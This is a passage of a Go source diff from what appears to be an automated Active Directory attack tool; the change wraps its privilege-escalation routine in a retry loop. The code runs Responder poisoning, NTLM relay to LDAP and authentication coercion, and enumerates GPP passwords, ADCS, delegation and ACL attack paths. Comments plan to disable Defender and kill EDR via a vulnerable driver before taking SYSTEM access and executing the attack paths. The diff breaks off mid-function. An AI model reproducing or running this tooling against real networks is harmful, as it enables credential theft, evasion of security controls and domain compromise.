@@ -14,6 +14,17 @@ import (
 	"adpack/internal/resolver/cert"
 	"adpack/planner"
 	"adpack/tools"
+	"adpack/utils"
+)
+
+type DeltaClass int
+
+const (
+	DeltaNone DeltaClass = iota
+	DeltaCredential
+	DeltaEdge
+	DeltaPath
+	DeltaNoise
 )
 
 func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, executePaths bool) *core.ToolResult {
@@ -33,430 +44,449 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		return result
 	}
 
-	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
+	maxIter := 5
 
-	// ── Runtime services (Responder + Relay, non-stealth only) ──
-	var runtime core.RuntimeProvider
-	relayEdges := make(chan core.PrivilegeEdge, 64)
-	if RuntimeFactory != nil && !isStealthPolicy(evasionProfile) {
-		runtime = RuntimeFactory()
+	for iter := 0; iter < maxIter; iter++ {
+		credsBefore := len(state.Creds)
+		edgesBefore := len(state.Edges)
 
-		// Start Responder first (poisoner generates traffic)
-		respCfg := core.ResponderConfig{
-			ID:        "responder-main",
-			Label:     "Responder Poisoner",
-			Interface: "eth0",
-			Verbose:   true,
-			WPAD:      true,
-		}
-		if err := runtime.StartResponder(ctx, respCfg); err != nil {
-			fmt.Printf("[!] Failed to start Responder: %v\n", err)
-		} else {
-			fmt.Printf("[+] Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)\n")
-		}
+		exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
+		ctx, cancel := context.WithCancel(context.Background())
+		defer cancel()
 
-		// Start relay as receiver
-		relayCfg := core.RelayConfig{
-			ID:          "ntlmrelayx-main",
-			Label:       "NTLM Relay Listener",
-			InterfaceIP: "0.0.0.0",
-			Target:      "ldap://" + host.IP,
-			SMBServer:   true,
-			HTTPServer:  true,
-		}
-		if err := runtime.StartRelay(ctx, relayCfg); err != nil {
-			fmt.Printf("[!] Failed to start relay: %v\n", err)
-		} else {
-			fmt.Printf("[+] NTLM relay started on 0.0.0.0 → ldap://%s\n", host.IP)
-		}
+		// ── Runtime services (Responder + Relay, non-stealth only) ──
+		var runtime core.RuntimeProvider
+		relayEdges := make(chan core.PrivilegeEdge, 64)
+		if RuntimeFactory != nil && !isStealthPolicy(evasionProfile) {
+			runtime = RuntimeFactory()
 
-		// Start coercer to trigger authentications
-		coercerTargets := []string{host.IP}
-		coercerCfg := core.CoercerConfig{
-			ID:          "coercer-main",
-			Label:       "Coercer Trigger",
-			SourceLabel: host.IP,
-			InterfaceIP: "0.0.0.0",
-			Targets:     coercerTargets,
-			Methods:     []string{},
-			Delay:       120 * time.Second,
-		}
-		if err := runtime.StartCoercer(ctx, coercerCfg); err != nil {
-			fmt.Printf("[!] Failed to start coercer: %v\n", err)
-		} else {
-			fmt.Printf("[+] Coercer started, targeting %d host(s)\n", len(coercerTargets))
-		}
+			// Start Responder first (poisoner generates traffic)
+			respCfg := core.ResponderConfig{
+				ID:        "responder-main",
+				Label:     "Responder Poisoner",
+				Interface: "eth0",
+				Verbose:   true,
+				WPAD:      true,
+			}
+			if err := runtime.StartResponder(ctx, respCfg); err != nil {
+				fmt.Printf("[!] Failed to start Responder: %v\n", err)
+			} else {
+				fmt.Printf("[+] Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)\n")
+			}
 
-		// Stop all services on return
-		defer runtime.StopAll()
+			// Start relay as receiver
+			relayCfg := core.RelayConfig{
+				ID:          "ntlmrelayx-main",
+				Label:       "NTLM Relay Listener",
+				InterfaceIP: "0.0.0.0",
+				Target:      "ldap://" + host.IP,
+				SMBServer:   true,
+				HTTPServer:  true,
+			}
+			if err := runtime.StartRelay(ctx, relayCfg); err != nil {
+				fmt.Printf("[!] Failed to start relay: %v\n", err)
+			} else {
+				fmt.Printf("[+] NTLM relay started on 0.0.0.0 → ldap://%s\n", host.IP)
+			}
 
-		// Consume events from all services into edge channel
-		go func() {
-			for {
-				select {
-				case evt, ok := <-runtime.Events():
-					if !ok {
-						return
-					}
-					if edge := materializeEdgeFromEvent(evt); edge != nil {
-						relayEdges <- *edge
-					}
-				case <-ctx.Done():
-					// Drain any remaining events so senders don't block
-					for {
-						select {
-						case _, ok := <-runtime.Events():
-							if !ok {
+			// Start coercer to trigger authentications
+			coercerTargets := []string{host.IP}
+			coercerCfg := core.CoercerConfig{
+				ID:          "coercer-main",
+				Label:       "Coercer Trigger",
+				SourceLabel: host.IP,
+				InterfaceIP: "0.0.0.0",
+				Targets:     coercerTargets,
+				Methods:     []string{},
+				Delay:       120 * time.Second,
+			}
+			if err := runtime.StartCoercer(ctx, coercerCfg); err != nil {
+				fmt.Printf("[!] Failed to start coercer: %v\n", err)
+			} else {
+				fmt.Printf("[+] Coercer started, targeting %d host(s)\n", len(coercerTargets))
+			}
+
+			// Stop all services on return
+			defer runtime.StopAll()
+
+			// Consume events from all services into edge channel
+			go func() {
+				for {
+					select {
+					case evt, ok := <-runtime.Events():
+						if !ok {
+							return
+						}
+						if edge := materializeEdgeFromEvent(evt); edge != nil {
+							relayEdges <- *edge
+						}
+					case <-ctx.Done():
+						// Drain any remaining events so senders don't block
+						for {
+							select {
+							case _, ok := <-runtime.Events():
+								if !ok {
+									return
+								}
+							default:
 								return
 							}
-						default:
-							return
 						}
 					}
 				}
-			}
-		}()
+			}()
 
-		// Attach artifact resolver pipeline (certipy → identity extraction)
-		resolvers := []resolver.ArtifactResolver{&cert.CertResolver{}}
-		resolver.AttachResolverPipeline(ctx, runtime, state, resolvers...)
-	}
-
-	// ── LDAP checks ──────────────────────────────────────────
-	provider := NewNetExecProvider(core.ProviderConfig{
-		Host: host.IP, Domain: domain,
-		Username: user, Password: pass, Hash: hash,
-	})
-
-	// GPP passwords (quick nxc module check)
-	fmt.Println("[*] Checking GPP passwords in SYSVOL...")
-	gppR := exec.Execute(ctx, core.Action{
-		Target: core.HostRef{Name: host.IP, Domain: domain},
-		Method: "ldap", Artifact: "-M", Arguments: []string{"gpp_password"},
-		Timeout: 30 * time.Second,
-	})
-	if gppR.Success {
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
-			Source: "gpp_password", Key: "status",
-			Value: "GPP check complete", RawOutput: gppR.Output,
-			Timestamp: time.Now(),
-		})
-	}
-
-	// ADCS vulnerable template enumeration
-	fmt.Println("[*] Checking ADCS vulnerable templates...")
-	adcsR := exec.Execute(ctx, core.Action{
-		Target: core.HostRef{Name: host.IP, Domain: domain},
-		Method: "ldap", Artifact: "-M", Arguments: []string{"adcs"},
-		Timeout: 30 * time.Second,
-	})
-	if adcsR.Success {
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
-			Source: "adcs", Key: "status",
-			Value: "ADCS check complete", RawOutput: adcsR.Output,
-			Timestamp: time.Now(),
-		})
-	}
-
-	// RBCD check
-	fmt.Println("[*] Checking RBCD...")
-	rbcdR := exec.Execute(ctx, core.Action{
-		Target: core.HostRef{Name: host.IP, Domain: domain},
-		Method: "ldap", Artifact: "-M", Arguments: []string{"rbcd"},
-		Timeout: 30 * time.Second,
-	})
-	if rbcdR.Success {
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
-			Source: "rbcd", Key: "status",
-			Value: "RBCD check complete", RawOutput: rbcdR.Output,
-			Timestamp: time.Now(),
-		})
-	}
-
-	// ── ACL enumeration via daclread ──────────────────────────
-	fmt.Println("[*] Enumerating ACL privilege edges (daclread)...")
-	targets := highValueTargets(state)
-	if len(targets) == 0 {
-		// Fall back to common targets if state is sparse
-		targets = []string{"Domain Admins", "Administrators", "Domain Controllers"}
-	}
-
-	edgeCount := 0
-	for _, t := range targets {
-		edges, err := provider.EnumerateACLs(ctx, t)
-		if err != nil {
-			fmt.Printf("[!] daclread failed for %s: %v\n", t, err)
-			continue
+			// Attach artifact resolver pipeline (certipy → identity extraction)
+			resolvers := []resolver.ArtifactResolver{&cert.CertResolver{}}
+			resolver.AttachResolverPipeline(ctx, runtime, state, resolvers...)
 		}
-		if len(edges) > 0 {
-			state.Edges = append(state.Edges, edges...)
-			edgeCount += len(edges)
-			fmt.Printf("[+] %d ACE(s) found on %s\n", len(edges), t)
-			for _, e := range edges {
-				fmt.Printf("      %s → %s → %s\n",
-					e.SourcePrincipal, e.AccessRight, e.TargetPrincipal)
+
+		// ── LDAP checks ──────────────────────────────────────────
+		provider := NewNetExecProvider(core.ProviderConfig{
+			Host: host.IP, Domain: domain,
+			Username: user, Password: pass, Hash: hash,
+		})
+
+		// GPP passwords (quick nxc module check)
+		fmt.Println("[*] Checking GPP passwords in SYSVOL...")
+		gppR := exec.Execute(ctx, core.Action{
+			Target: core.HostRef{Name: host.IP, Domain: domain},
+			Method: "ldap", Artifact: "-M", Arguments: []string{"gpp_password"},
+			Timeout: 30 * time.Second,
+		})
+		if gppR.Success {
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
+				Source: "gpp_password", Key: "status",
+				Value: "GPP check complete", RawOutput: gppR.Output,
+				Timestamp: time.Now(),
+			})
+		}
+
+		// ADCS vulnerable template enumeration
+		fmt.Println("[*] Checking ADCS vulnerable templates...")
+		adcsR := exec.Execute(ctx, core.Action{
+			Target: core.HostRef{Name: host.IP, Domain: domain},
+			Method: "ldap", Artifact: "-M", Arguments: []string{"adcs"},
+			Timeout: 30 * time.Second,
+		})
+		if adcsR.Success {
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
+				Source: "adcs", Key: "status",
+				Value: "ADCS check complete", RawOutput: adcsR.Output,
+				Timestamp: time.Now(),
+			})
+		}
+
+		// RBCD check
+		fmt.Println("[*] Checking RBCD...")
+		rbcdR := exec.Execute(ctx, core.Action{
+			Target: core.HostRef{Name: host.IP, Domain: domain},
+			Method: "ldap", Artifact: "-M", Arguments: []string{"rbcd"},
+			Timeout: 30 * time.Second,
+		})
+		if rbcdR.Success {
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
+				Source: "rbcd", Key: "status",
+				Value: "RBCD check complete", RawOutput: rbcdR.Output,
+				Timestamp: time.Now(),
+			})
+		}
+
+		// ── ACL enumeration via daclread ──────────────────────────
+		fmt.Println("[*] Enumerating ACL privilege edges (daclread)...")
+		targets := highValueTargets(state)
+		if len(targets) == 0 {
+			// Fall back to common targets if state is sparse
+			targets = []string{"Domain Admins", "Administrators", "Domain Controllers"}
+		}
+
+		edgeCount := 0
+		for _, t := range targets {
+			edges, err := provider.EnumerateACLs(ctx, t)
+			if err != nil {
+				fmt.Printf("[!] daclread failed for %s: %v\n", t, err)
+				continue
+			}
+			if len(edges) > 0 {
+				state.Edges = append(state.Edges, edges...)
+				edgeCount += len(edges)
+				fmt.Printf("[+] %d ACE(s) found on %s\n", len(edges), t)
+				for _, e := range edges {
+					fmt.Printf("      %s → %s → %s\n",
+						e.SourcePrincipal, e.AccessRight, e.TargetPrincipal)
+					result.Evidence = append(result.Evidence, core.EvidenceEntry{
+						Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
+						Source: "daclread", Key: e.SourcePrincipal,
+						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
+						Confidence: e.Confidence, Timestamp: time.Now(),
+					})
+				}
+			}
+		}
+
+		// ── MSSQL impersonation edges ───────────────────────────
+		fmt.Println("[*] Checking MSSQL impersonation privileges (mssql_priv)...")
+		mssqlEdges, err := provider.EnumerateMSSQLImpersonations(ctx)
+		if err != nil {
+			fmt.Printf("[!] mssql_priv failed: %v\n", err)
+		} else if len(mssqlEdges) > 0 {
+			state.Edges = append(state.Edges, mssqlEdges...)
+			edgeCount += len(mssqlEdges)
+			fmt.Printf("[+] %d MSSQL privilege edge(s) found\n", len(mssqlEdges))
+			for _, e := range mssqlEdges {
+				fmt.Printf("      %s → %s → %s [exploit=%.1f noise=%.1f]\n",
+					e.SourcePrincipal, e.AccessRight, e.TargetPrincipal,
+					e.Exploitability, e.Noise)
 				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
-					Source: "daclread", Key: e.SourcePrincipal,
+					Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+					Source: "mssql_priv", Key: e.SourcePrincipal,
 					Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
 					Confidence: e.Confidence, Timestamp: time.Now(),
 				})
 			}
-		}
-	}
-
-	// ── MSSQL impersonation edges ───────────────────────────
-	fmt.Println("[*] Checking MSSQL impersonation privileges (mssql_priv)...")
-	mssqlEdges, err := provider.EnumerateMSSQLImpersonations(ctx)
-	if err != nil {
-		fmt.Printf("[!] mssql_priv failed: %v\n", err)
-	} else if len(mssqlEdges) > 0 {
-		state.Edges = append(state.Edges, mssqlEdges...)
-		edgeCount += len(mssqlEdges)
-		fmt.Printf("[+] %d MSSQL privilege edge(s) found\n", len(mssqlEdges))
-		for _, e := range mssqlEdges {
-			fmt.Printf("      %s → %s → %s [exploit=%.1f noise=%.1f]\n",
-				e.SourcePrincipal, e.AccessRight, e.TargetPrincipal,
-				e.Exploitability, e.Noise)
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-				Source: "mssql_priv", Key: e.SourcePrincipal,
-				Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
-				Confidence: e.Confidence, Timestamp: time.Now(),
-			})
-		}
-	} else {
-		fmt.Println("[*] No MSSQL impersonation edges found")
-	}
-
-	// ── ADCS certificate template edges ──────────────────────
-	fmt.Println("[*] Enumerating ADCS certificate templates (certipy-find)...")
-	adcsTemplates, err := provider.EnumerateADCSTemplates(ctx)
-	if err != nil {
-		fmt.Printf("[!] certipy-find failed: %v\n", err)
-	} else if len(adcsTemplates) > 0 {
-		fmt.Printf("[+] %d ADCS template(s) found\n", len(adcsTemplates))
-		for _, t := range adcsTemplates {
-			if t.Vuln == "" {
-				continue
-			}
-			adcsEdges := adcsEdgeSet(t, domain, host.IP, false)
-			state.Edges = append(state.Edges, adcsEdges...)
-			edgeCount += len(adcsEdges)
-			if len(adcsEdges) > 0 {
-				fmt.Printf("      %s [%s] → %d edge(s)\n",
-					t.Name, t.Vuln, len(adcsEdges))
-				for _, e := range adcsEdges {
-					fmt.Printf("        %s → %s [exploit=%.1f noise=%.1f]\n",
-						e.SourcePrincipal, e.TargetPrincipal,
-						e.Exploitability, e.Noise)
-					result.Evidence = append(result.Evidence, core.EvidenceEntry{
-						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-						Source: "certipy-find", Key: e.SourcePrincipal,
-						Value:      fmt.Sprintf("%s → %s [%s]", e.AccessRight, e.TargetPrincipal, t.Name),
-						Confidence: e.Confidence, Timestamp: time.Now(),
-					})
-				}
-			}
-		}
-	} else {
-		fmt.Println("[*] No ADCS templates found")
-	}
-
-	// ── Relay capture edges ───────────────────────────────────
-	if runtime != nil {
-		drained := drainRelayEdges(relayEdges)
-		if len(drained) > 0 {
-			drained = dedupEdges(drained, state.Edges)
-			if len(drained) > 0 {
-				state.Edges = append(state.Edges, drained...)
-				edgeCount += len(drained)
-				fmt.Printf("[+] %d new relay capture edge(s) materialized\n", len(drained))
-				for _, e := range drained {
-					fmt.Printf("      %s → %s [%s]\n",
-						e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
-					result.Evidence = append(result.Evidence, core.EvidenceEntry{
-						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-						Source: "ntlmrelayx", Key: e.SourcePrincipal,
-						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
-						Confidence: e.Confidence, Timestamp: time.Now(),
-					})
-				}
-			}
-		}
-		runtime.ApplyToState(state)
-	}
-
-	// ── Delegation edges (unconstrained, constrained, RBCD) ──
-	fmt.Println("[*] Enumerating delegation relationships...")
-	delegEdges, err := provider.EnumerateDelegation(ctx)
-	if err != nil {
-		fmt.Printf("[!] Delegation enumeration failed: %v\n", err)
-	} else if len(delegEdges) > 0 {
-		state.Edges = append(state.Edges, delegEdges...)
-		edgeCount += len(delegEdges)
-		fmt.Printf("[+] %d delegation edge(s) found\n", len(delegEdges))
-		for _, e := range delegEdges {
-			fmt.Printf("      %s → %s [%s]\n",
-				e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-				Source: "delegation", Key: e.SourcePrincipal,
-				Value:      fmt.Sprintf("%s → %s [%s]", e.SourcePrincipal, e.TargetPrincipal, e.AccessRight),
-				Confidence: e.Confidence, Timestamp: time.Now(),
-			})
-		}
-	} else {
-		fmt.Println("[*] No delegation relationships found")
-	}
-
-	// ── BloodHound graph enrichment ────────────────────────────
-	fmt.Println("[*] Enumerating BloodHound graph (bloodhound-python)...")
-	bhDir, bhErr := os.MkdirTemp("", "adpack-bh-*")
-	if bhErr == nil {
-		defer os.RemoveAll(bhDir)
-		bhCfg := bloodhound.CollectConfig{
-			Domain:    domain,
-			Username:  user,
-			Password:  pass,
-			Hash:      hash,
-			DCHost:    host.Hostname + "." + domain,
-			DNSHost:   host.IP,
-			OutputDir: bhDir,
-			Methods:   bloodhound.DefaultMethods,
-		}
-		if bhErr = bloodhound.CollectAndIngest(ctx, bhCfg, state); bhErr != nil {
-			fmt.Printf("[!] BloodHound ingestion failed: %v\n", bhErr)
 		} else {
-			bhCount := len(state.Edges)
-			bhTotal := 0
-			for _, e := range state.Edges {
-				if e.Source == "bloodhound" {
-					bhTotal++
-				}
-			}
-			fmt.Printf("[+] BloodHound merged: %d users, %d groups, %d computers, %d BH edges (total %d edges)\n",
-				len(state.Users), len(state.Groups), len(state.Computers), bhTotal, bhCount)
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
-				Source: "bloodhound", Key: "ingested",
-				Value:     fmt.Sprintf("%d edges merged", bhTotal),
-				Timestamp: time.Now(),
-			})
+			fmt.Println("[*] No MSSQL impersonation edges found")
 		}
-	} else {
-		fmt.Printf("[!] Cannot create temp dir for BloodHound: %v\n", bhErr)
-	}
 
-	// ── Weighted path planning (baseline) ──────────────────────
-	var availCaps []string
-	if tools.NetExec.Available() {
-		availCaps = append(availCaps, "nxc")
-	}
-	if runtime != nil {
-		health := runtimeHealthSummary(runtime)
-		fmt.Printf("[*] Runtime: %s\n", health)
-	}
-	baselinePlans := runPlanning(state, result, edgeCount, availCaps)
-
-	// ── SUB-PHASE 1: Pre-evasion ──────────────────────────
-	// UnDefend (no admin needed, blocks Defender updates).
-	// Then PhantomKiller (needs admin, BYOVD EDR kill via BootRepair.sys).
-	isBypass := IsBypassProfile(evasionProfile)
-	if isBypass {
-		runPreEvasion(ctx, state, host, exec, result)
-	}
-
-	// ── SUB-PHASE 2: SYSTEM check via smbexec → atexec ───
-	gotSystem := false
-	r := exec.Execute(ctx, core.Action{
-		Target: core.HostRef{Name: host.IP, Domain: domain},
-		Method: "system_check", Timeout: 45 * time.Second,
-	})
-	if r.Success {
-		fmt.Printf("[+] SYSTEM access confirmed on %s (%s)\n", host.IP, r.Method)
-		gotSystem = true
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-			Source: r.Method, Key: host.IP, Value: "SYSTEM",
-			Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
-		})
-	} else {
-		fmt.Printf("[!] No SYSTEM context obtained on %s via smbexec/atexec\n", host.IP)
-	}
-
-	// ── SUB-PHASE 3: Local LPE chain (supplementary) ──────
-	if !gotSystem {
-		runLocalLPEChain(ctx, state, host, exec, result)
-	}
-
-	// ── Runtime edge drain + replanning ───────────────────────
-	if cap(relayEdges) > 0 {
-		drained := drainRelayEdges(relayEdges)
-		if len(drained) > 0 {
-			drained = dedupEdges(drained, state.Edges)
-			if len(drained) > 0 {
-				state.Edges = append(state.Edges, drained...)
-				edgeCount += len(drained)
-				fmt.Printf("[+] %d new runtime capture edge(s) materialized during execution\n", len(drained))
-				for _, e := range drained {
-					fmt.Printf("      %s → %s [%s] (conf=%.1f)\n",
-						e.SourcePrincipal, e.TargetPrincipal, e.AccessRight, e.Confidence)
-					result.Evidence = append(result.Evidence, core.EvidenceEntry{
-						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-						Source: "runtime", Key: e.SourcePrincipal,
-						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
-						Confidence: e.Confidence, Timestamp: time.Now(),
-					})
+		// ── ADCS certificate template edges ──────────────────────
+		fmt.Println("[*] Enumerating ADCS certificate templates (certipy-find)...")
+		adcsTemplates, err := provider.EnumerateADCSTemplates(ctx)
+		if err != nil {
+			fmt.Printf("[!] certipy-find failed: %v\n", err)
+		} else if len(adcsTemplates) > 0 {
+			fmt.Printf("[+] %d ADCS template(s) found\n", len(adcsTemplates))
+			for _, t := range adcsTemplates {
+				if t.Vuln == "" {
+					continue
+				}
+				adcsEdges := adcsEdgeSet(t, domain, host.IP, false)
+				state.Edges = append(state.Edges, adcsEdges...)
+				edgeCount += len(adcsEdges)
+				if len(adcsEdges) > 0 {
+					fmt.Printf("      %s [%s] → %d edge(s)\n",
+						t.Name, t.Vuln, len(adcsEdges))
+					for _, e := range adcsEdges {
+						fmt.Printf("        %s → %s [exploit=%.1f noise=%.1f]\n",
+							e.SourcePrincipal, e.TargetPrincipal,
+							e.Exploitability, e.Noise)
+						result.Evidence = append(result.Evidence, core.EvidenceEntry{
+							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+							Source: "certipy-find", Key: e.SourcePrincipal,
+							Value:      fmt.Sprintf("%s → %s [%s]", e.AccessRight, e.TargetPrincipal, t.Name),
+							Confidence: e.Confidence, Timestamp: time.Now(),
+						})
+					}
 				}
 			}
+		} else {
+			fmt.Println("[*] No ADCS templates found")
+		}
+
+		// ── Relay capture edges ───────────────────────────────────
+		if runtime != nil {
+			drained := drainRelayEdges(relayEdges)
+			if len(drained) > 0 {
+				drained = dedupEdges(drained, state.Edges)
+				if len(drained) > 0 {
+					state.Edges = append(state.Edges, drained...)
+					edgeCount += len(drained)
+					fmt.Printf("[+] %d new relay capture edge(s) materialized\n", len(drained))
+					for _, e := range drained {
+						fmt.Printf("      %s → %s [%s]\n",
+							e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
+						result.Evidence = append(result.Evidence, core.EvidenceEntry{
+							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+							Source: "ntlmrelayx", Key: e.SourcePrincipal,
+							Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
+							Confidence: e.Confidence, Timestamp: time.Now(),
+						})
+					}
+				}
+			}
+			runtime.ApplyToState(state)
+		}
+
+		// ── Delegation edges (unconstrained, constrained, RBCD) ──
+		fmt.Println("[*] Enumerating delegation relationships...")
+		delegEdges, err := provider.EnumerateDelegation(ctx)
+		if err != nil {
+			fmt.Printf("[!] Delegation enumeration failed: %v\n", err)
+		} else if len(delegEdges) > 0 {
+			state.Edges = append(state.Edges, delegEdges...)
+			edgeCount += len(delegEdges)
+			fmt.Printf("[+] %d delegation edge(s) found\n", len(delegEdges))
+			for _, e := range delegEdges {
+				fmt.Printf("      %s → %s [%s]\n",
+					e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
+				result.Evidence = append(result.Evidence, core.EvidenceEntry{
+					Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+					Source: "delegation", Key: e.SourcePrincipal,
+					Value:      fmt.Sprintf("%s → %s [%s]", e.SourcePrincipal, e.TargetPrincipal, e.AccessRight),
+					Confidence: e.Confidence, Timestamp: time.Now(),
+				})
+			}
+		} else {
+			fmt.Println("[*] No delegation relationships found")
+		}
+
+		// ── BloodHound graph enrichment ────────────────────────────
+		fmt.Println("[*] Enumerating BloodHound graph (bloodhound-python)...")
+		bhDir, bhErr := os.MkdirTemp("", "adpack-bh-*")
+		if bhErr == nil {
+			defer os.RemoveAll(bhDir)
+			bhCfg := bloodhound.CollectConfig{
+				Domain:    domain,
+				Username:  user,
+				Password:  pass,
+				Hash:      hash,
+				DCHost:    host.Hostname + "." + domain,
+				DNSHost:   host.IP,
+				OutputDir: bhDir,
+				Methods:   bloodhound.DefaultMethods,
+			}
+			if bhErr = bloodhound.CollectAndIngest(ctx, bhCfg, state); bhErr != nil {
+				fmt.Printf("[!] BloodHound ingestion failed: %v\n", bhErr)
+			} else {
+				bhCount := len(state.Edges)
+				bhTotal := 0
+				for _, e := range state.Edges {
+					if e.Source == "bloodhound" {
+						bhTotal++
+					}
+				}
+				fmt.Printf("[+] BloodHound merged: %d users, %d groups, %d computers, %d BH edges (total %d edges)\n",
+					len(state.Users), len(state.Groups), len(state.Computers), bhTotal, bhCount)
+				result.Evidence = append(result.Evidence, core.EvidenceEntry{
+					Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
+					Source: "bloodhound", Key: "ingested",
+					Value:     fmt.Sprintf("%d edges merged", bhTotal),
+					Timestamp: time.Now(),
+				})
+			}
+		} else {
+			fmt.Printf("[!] Cannot create temp dir for BloodHound: %v\n", bhErr)
+		}
+
+		// ── Weighted path planning (baseline) ──────────────────────
+		var availCaps []string
+		if tools.NetExec.Available() {
+			availCaps = append(availCaps, "nxc")
 		}
 		if runtime != nil {
-			runtime.ApplyToState(state)
 			health := runtimeHealthSummary(runtime)
-			fmt.Printf("[*] Runtime post-execution: %s\n", health)
+			fmt.Printf("[*] Runtime: %s\n", health)
 		}
-	}
+		baselinePlans := runPlanning(state, result, edgeCount, availCaps)
 
-	// Replan if new edges were added
-	if edgeCount > 0 {
-		newPlans := runPlanning(state, result, edgeCount, availCaps)
-		if len(newPlans) > 0 && len(baselinePlans) > 0 {
-			for target, plan := range newPlans {
-				if old, ok := baselinePlans[target]; !ok || plan.TotalCost < old.TotalCost {
-					fmt.Printf("  ⤴ Better path to %s: score %.1f (was %.1f)\n",
-						target, plan.TotalCost, old.TotalCost)
+		// ── SUB-PHASE 1: Pre-evasion ──────────────────────────
+		// UnDefend (no admin needed, blocks Defender updates).
+		// Then PhantomKiller (needs admin, BYOVD EDR kill via BootRepair.sys).
+		isBypass := IsBypassProfile(evasionProfile)
+		if isBypass {
+			runPreEvasion(ctx, state, host, exec, result)
+		}
+
+		// ── SUB-PHASE 2: SYSTEM check via smbexec → atexec ───
+		gotSystem := false
+		r := exec.Execute(ctx, core.Action{
+			Target: core.HostRef{Name: host.IP, Domain: domain},
+			Method: "system_check", Timeout: 45 * time.Second,
+		})
+		if r.Success {
+			fmt.Printf("[+] SYSTEM access confirmed on %s (%s)\n", host.IP, r.Method)
+			gotSystem = true
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+				Source: r.Method, Key: host.IP, Value: "SYSTEM",
+				Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
+			})
+		} else {
+			fmt.Printf("[!] No SYSTEM context obtained on %s via smbexec/atexec\n", host.IP)
+		}
+
+		// ── SUB-PHASE 3: Local LPE chain (supplementary) ──────
+		if !gotSystem {
+			runLocalLPEChain(ctx, state, host, exec, result)
+		}
+
+		// ── Runtime edge drain + replanning ───────────────────────
+		if cap(relayEdges) > 0 {
+			drained := drainRelayEdges(relayEdges)
+			if len(drained) > 0 {
+				drained = dedupEdges(drained, state.Edges)
+				if len(drained) > 0 {
+					state.Edges = append(state.Edges, drained...)
+					edgeCount += len(drained)
+					fmt.Printf("[+] %d new runtime capture edge(s) materialized during execution\n", len(drained))
+					for _, e := range drained {
+						fmt.Printf("      %s → %s [%s] (conf=%.1f)\n",
+							e.SourcePrincipal, e.TargetPrincipal, e.AccessRight, e.Confidence)
+						result.Evidence = append(result.Evidence, core.EvidenceEntry{
+							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+							Source: "runtime", Key: e.SourcePrincipal,
+							Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
+							Confidence: e.Confidence, Timestamp: time.Now(),
+						})
+					}
+				}
+			}
+			if runtime != nil {
+				runtime.ApplyToState(state)
+				health := runtimeHealthSummary(runtime)
+				fmt.Printf("[*] Runtime post-execution: %s\n", health)
+			}
+		}
+
+		// Replan if new edges were added
+		if edgeCount > 0 {
+			newPlans := runPlanning(state, result, edgeCount, availCaps)
+			if len(newPlans) > 0 && len(baselinePlans) > 0 {
+				for target, plan := range newPlans {
+					if old, ok := baselinePlans[target]; !ok || plan.TotalCost < old.TotalCost {
+						fmt.Printf("  ⤴ Better path to %s: score %.1f (was %.1f)\n",
+							target, plan.TotalCost, old.TotalCost)
+					}
 				}
 			}
 		}
-	}
 
-	// ── Optional path execution ────────────────────────────
-	if executePaths && len(baselinePlans) > 0 {
-		fmt.Println("\n[*] Executing best planned paths (reconciliation-gated)...")
-		ctx2, cancel2 := context.WithCancel(context.Background())
-		defer cancel2()
-		executed := ExecuteBestPaths(ctx2, state, baselinePlans, host.IP, result)
-		if executed > 0 {
-			fmt.Printf("[+] Path execution: %d steps completed\n", executed)
